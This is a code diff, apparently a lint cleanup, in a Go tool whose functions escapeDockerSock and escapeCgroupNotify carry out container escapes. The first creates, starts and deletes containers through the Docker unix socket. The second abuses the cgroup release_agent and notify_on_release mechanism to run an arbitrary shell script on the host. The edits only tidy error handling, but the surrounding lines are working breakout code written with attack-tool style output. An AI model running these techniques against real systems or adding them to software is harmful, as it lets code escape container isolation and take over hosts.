@@ -246,17 +246,16 @@ func escapeDockerSock(command, image string) (string, string) {
 	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))
 
 	// Start container
-	out, err = exec.Command("curl", "-s", "--unix-socket", sockPath,
+	if _, err = exec.Command("curl", "-s", "--unix-socket", sockPath,
 		"-X", "POST",
-		fmt.Sprintf("http://localhost/containers/%s/start", containerID)).CombinedOutput()
-	if err != nil {
+		fmt.Sprintf("http://localhost/containers/%s/start", containerID)).CombinedOutput(); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
 		return sb.String(), "error"
 	}
 	sb.WriteString("[+] Container started\n")
 
 	// Wait for completion and get logs
-	exec.Command("curl", "-s", "--unix-socket", sockPath,
+	_, _ = exec.Command("curl", "-s", "--unix-socket", sockPath,
 		fmt.Sprintf("http://localhost/containers/%s/wait", containerID)).CombinedOutput()
 
 	logs, _ := exec.Command("curl", "-s", "--unix-socket", sockPath,
@@ -267,7 +266,7 @@ func escapeDockerSock(command, image string) (string, string) {
 	sb.WriteString(cleanDockerLogs(string(logs)))
 
 	// Cleanup: remove container
-	exec.Command("curl", "-s", "--unix-socket", sockPath,
+	_, _ = exec.Command("curl", "-s", "--unix-socket", sockPath,
 		"-X", "DELETE",
 		fmt.Sprintf("http://localhost/containers/%s?force=true", containerID)).CombinedOutput()
 	sb.WriteString("\n[+] Container removed\n")
@@ -303,7 +302,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Create child cgroup
 	childDir := filepath.Join(cgroupDir, "x")
 	if err := os.MkdirAll(childDir, 0o755); err != nil {
-		syscall.Unmount(cgroupDir, 0)
+		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to create child cgroup: %v", err), "error"
 	}
@@ -329,7 +328,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Write script
 	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
 	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
-		syscall.Unmount(cgroupDir, 0)
+		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to write escape script: %v", err), "error"
 	}
@@ -346,7 +345,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	releaseAgentPath := filepath.Join(cgroupDir, "release_agent")
 	if err := os.WriteFile(releaseAgentPath, []byte(releaseAgentScript), 0o644); err != nil {
 		os.Remove(scriptPath)
-		syscall.Unmount(cgroupDir, 0)
+		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to set release_agent: %v", err), "error"
 	}
@@ -356,7 +355,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	notifyPath := filepath.Join(childDir, "notify_on_release")
 	if err := os.WriteFile(notifyPath, []byte("1"), 0o644); err != nil {
 		os.Remove(scriptPath)
-		syscall.Unmount(cgroupDir, 0)
+		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to enable notify_on_release: %v", err), "error"
 	}
@@ -384,7 +383,7 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	// Cleanup
 	os.Remove(scriptPath)
-	syscall.Unmount(cgroupDir, 0)
+	_ = syscall.Unmount(cgroupDir, 0)
 	os.RemoveAll(cgroupDir)
 
 	return sb.String(), "success"
